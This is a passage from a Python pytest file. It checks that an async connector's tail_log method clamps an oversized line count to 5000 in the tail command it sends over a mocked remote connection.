        assert result["content"] == "some output"

    @pytest.mark.asyncio
    async def test_lines_clamped(self, connector):
        """lines should be clamped between 1 and 5000."""
        mock_conn = MagicMock()
        mock_conn._transport = MagicMock()
        mock_conn.run = AsyncMock(
            return_value=_fake_run_result(stdout="ok", exit_status=0)
        )
        connector._connection = mock_conn

        await connector.tail_log("/var/log/app.log", lines=99999)

        cmd = mock_conn.run.call_args[0][0]
        assert "tail -n 5000" in cmd
